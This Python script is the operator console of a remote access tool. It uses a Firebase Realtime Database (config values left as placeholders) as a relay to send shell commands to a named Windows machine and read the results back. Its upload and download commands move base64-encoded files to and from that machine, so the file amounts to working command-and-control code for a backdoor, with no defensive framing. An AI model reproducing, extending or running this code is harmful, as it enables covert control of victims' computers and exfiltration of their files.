import socket
import json
import base64
import pyrebase
import secrets
import sys

class Listener:
	Device=""
	db = ""
	firebase = ""
	TerminalCode = ""
	def __init__(self, Device):
		firebaseConfig = {
			'apiKey': "XXXXXXX",
			'authDomain': "XXXXXXX",
			'databaseURL': "XXXXXXX",
			'projectId': "XXXXXXX",
			'storageBucket': "XXXXXXX",
			'messagingSenderId': "XXXXXXX",
			'appId': "1:XXXXXXX"

		}
		self.Device=Device
		self.firebase = pyrebase.initialize_app(firebaseConfig)

		self.db = self.firebase.database()
		recieved = self.db.child(Device).get().val()['packet']
		self.TerminalCode = recieved['TerminalCode']
		recieved = json.loads(recieved['Terminal'])
		print("[+] Got connection Status: "+str(recieved))

	def reliable_send(self,message):
		if (isinstance(message, str) or isinstance(message, list)):
			message = json.dumps(message)
		else:
			message = json.dumps(message.decode("utf-8"))
		data = {self.Device + "/packet/Listener": message}
		self.db.update(data)
		data = {self.Device + "/packet/ListenerCode": secrets.token_hex(nbytes=5)}
		self.db.update(data)
		print('sent!!')

	def reliable_recieve(self):
		while True:
			recieved = self.db.child(self.Device).get().val()['packet']
			if self.TerminalCode != recieved['TerminalCode']:
				# print(self.TerminalCode)
				self.TerminalCode = recieved['TerminalCode']
				# print(recieved['TerminalCode'])
				json_data = recieved['Terminal']
				return json.loads(json_data)

	def execute_remotely(self,command):
		self.reliable_send(command)
		if command[0]=="exit":
			exit()

		return self.reliable_recieve()  

	def write_file(self, path, content):
		with open(path, "wb")as file:
			file.write(base64.b64decode(content))
			return "[+] Download Successful"
	
	def read_file(self, path):
		with open(path, "rb") as file:
			return base64.b64encode(file.read())


	def run(self):
		while True:
			command = input(">> ")
			command = command.split(" ")
			try:
				if command[0] == "upload":
					file_content = self.read_file(command[1])
					command.append(file_content.decode("utf-8"))

				result = self.execute_remotely(command)

				if command[0] == "download" and "[-] Error " not in result :
					result=self.write_file(command[1], result)
			except Exception as e:
				result ="[-] Error during command execution own side"+str(e)
				print(e)
			print(bytes(result, 'utf-8').decode("utf-8"))


# Enter the Device Name You want to listen from
mylistener = Listener("DESKTOP-3NQULCT")
mylistener.run()
